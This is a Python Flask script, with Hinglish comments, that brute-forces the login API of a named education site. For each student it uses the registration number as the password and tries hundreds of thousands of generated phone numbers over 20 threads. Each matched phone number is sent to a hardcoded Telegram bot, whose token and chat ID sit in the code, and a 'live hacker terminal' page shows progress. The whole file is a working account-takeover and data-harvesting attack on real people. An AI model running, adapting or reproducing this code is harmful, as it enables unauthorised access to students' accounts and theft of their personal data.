import requests
import time
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, jsonify, render_template_string

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8845557626:AAHyHv_BNpKS8OG-YVphwMSthEorIncWtmM")
CHAT_ID = os.environ.get("CHAT_ID", "1634075045")

API_URL = "https://www.eduintern.in/api/auth/login"
FILE_NAME = "students.txt" 
THREADS = 20# Threads kam kar diye taaki server hang na ho

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "https://www.eduintern.in",
    "Referer": "https://www.eduintern.in/login",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0"
}

live_logs = []
current_reg = "Starting..."
total_scanned = 0
total_to_scan = 0

def add_log(text):
    global live_logs
    log_line = f"[{time.strftime('%H:%M:%S')}] {text}"
    live_logs.append(log_line)
    if len(live_logs) > 40: live_logs.pop(0)
    print(log_line, flush=True)

def send_telegram_msg(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=5)
    except: pass

def check(phone, password):
    try:
        r = requests.post(API_URL, json={"phone": phone, "password": password}, headers=HEADERS, timeout=10)
        data = r.json() if r.text else {}
        success = "student" in data or "user" in data or ("token" in data and "name" in data)
        return {"status": r.status_code, "success": success, "phone": phone}
    except Exception:
        return {"status": "ERROR", "success": False, "phone": phone}

# NUMBER GENERATOR (RAM ME LOAD NAHI HOGA)
def generate_numbers(last4):
    priority_1 = ['98', '97', '88', '70', '77', '84', '85', '91']
    priority_2 = ['89', '90', '93', '96', '80', '81', '82', '83', '86', '87']
    priority_3 = ['99', '72', '73', '74', '75', '76', '78', '79', '94', '95']
    priority_4 = ['60', '61', '62', '63', '64', '65', '66', '67', '68', '69']
    
    for p_list in [priority_1, priority_2, priority_3, priority_4]:
        for series in p_list:
            for i in range(10000):
                yield f"{series}{i:04d}{last4}"
                
    all_valid = set()
    for p_list in [priority_1, priority_2, priority_3, priority_4]:
        for series in p_list:
            for i in range(10000):
                all_valid.add(f"{series}{i:04d}")
                
    for digit in ['6', '7', '8', '9']:
        for i in range(100000):
            prefix = f"{digit}{i:05d}"
            if prefix not in all_valid:
                if len(set(prefix)) > 2:
                    yield f"{prefix}{last4}"

def process_student(index, reg_no, last4):
    global current_reg, total_scanned, total_to_scan
    current_reg = f"[{index}] Reg: {reg_no} (Ends: {last4})"
    total_scanned = 0
    total_to_scan = 399968 # Approx
    
    add_log("==========================================")
    add_log(f"TARGET START: {reg_no} (Ending: {last4})")
    add_log("==========================================")
    
    found_phone = None
    pending_phones = []
    
    # Generator use kar rahe hain taaki RAM full na ho
    numbers = list(generate_numbers(last4))
    
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(check, phone, reg_no): phone for phone in numbers}
        
        for future in as_completed(futures):
            total_scanned += 1
            res = future.result()
            
            if res["success"]:
                found_phone = res["phone"]
                add_log(f"✅ MATCH FOUND! Phone: {found_phone}")
                send_telegram_msg(f"[{index}] {reg_no}    {found_phone}  sus")
                break
            
            if res["status"] == "ERROR":
                pending_phones.append(res["phone"])
                
            if total_scanned % 5000 == 0:
                add_log(f"[{total_scanned}/{total_to_scan}] Scanning... Last: {res['phone']} ({res['status']})")

    # Retry
    if not found_phone and pending_phones:
        add_log(f"⏳ Retrying {len(pending_phones)} missed numbers...")
        for p_phone in pending_phones:
            res = check(p_phone, reg_no)
            if res["success"]:
                found_phone = res["phone"]
                add_log(f"✅ MATCH FOUND (in retry)! Phone: {found_phone}")
                send_telegram_msg(f"[{index}] {reg_no}    {found_phone}  sus")
                break
            time.sleep(1)

    if not found_phone:
        add_log(f"❌ NO MATCH for {reg_no}")
        send_telegram_msg(f"[{index}] {reg_no}    no match number found")
        
    send_telegram_msg("--------------------------------\nNext target...")

def run_hunter():
    time.sleep(3)
    try:
        with open(FILE_NAME, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
            
        add_log(f"Total {len(lines)} students mil gaye. Scanning shuru...")
        send_telegram_msg(f"🚀 Script start! Total {len(lines)} students.")
        
        for i, line in enumerate(lines, start=1):
            parts = line.split()
            if len(parts) >= 2:
                process_student(i, parts[0], parts[1])
                
        send_telegram_msg("✅ Saare students process ho gaye!")
    except Exception as e:
        add_log(f"Error: {e}")

@app.route('/')
def home():
    return render_template_string("""
    <html>
    <head>
        <title>Live Scanner</title>
        <style>
            body { background-color: #0d1117; color: #00ff00; font-family: 'Consolas', monospace; margin: 0; padding: 20px; }
            h3 { color: #ffffff; border-bottom: 1px solid #333; padding-bottom: 10px; }
            .stats { color: #00bfff; font-size: 18px; margin-bottom: 20px; }
            #terminal { background-color: #000; padding: 15px; border-radius: 5px; border: 1px solid #333; height: 70vh; overflow-y: auto; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
            .log-line { margin: 2px 0; font-size: 14px; }
            .success { color: #00ff00; font-weight: bold; }
            .error { color: #ff3333; }
        </style>
        <script>
            setInterval(function() {
                fetch('/logs').then(r => r.json()).then(data => {
                    document.getElementById('reg').innerText = data.current_reg;
                    document.getElementById('scanned').innerText = data.scanned;
                    document.getElementById('total').innerText = data.total;
                    let term = document.getElementById('terminal');
                    term.innerHTML = '';
                    data.logs.forEach(line => {
                        let div = document.createElement('div');
                        div.className = 'log-line';
                        if(line.includes('✅')) div.classList.add('success');
                        else if(line.includes('❌') || line.includes('ERROR')) div.classList.add('error');
                        div.innerText = line;
                        term.appendChild(div);
                    });
                    term.scrollTop = term.scrollHeight;
                });
            }, 3000);
        </script>
    </head>
    <body>
        <h3>💻 LIVE HACKER TERMINAL</h3>
        <div class="stats">
            <b>Target:</b> <span id="reg" style="color:#fff;">{{ current_reg }}</span><br>
            <b>Scanned:</b> <span id="scanned" style="color:#fff;">{{ total_scanned }}</span> / <span id="total" style="color:#fff;">{{ total_to_scan }}</span>
        </div>
        <div id="terminal"><div class="log-line">Loading...</div></div>
    </body>
    </html>
    """, current_reg=current_reg, total_scanned=total_scanned, total_to_scan=total_to_scan)

@app.route('/logs')
def get_logs():
    return jsonify({"current_reg": current_reg, "scanned": total_scanned, "total": total_to_scan, "logs": live_logs})

if __name__ == "__main__":
    threading.Thread(target=run_hunter, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
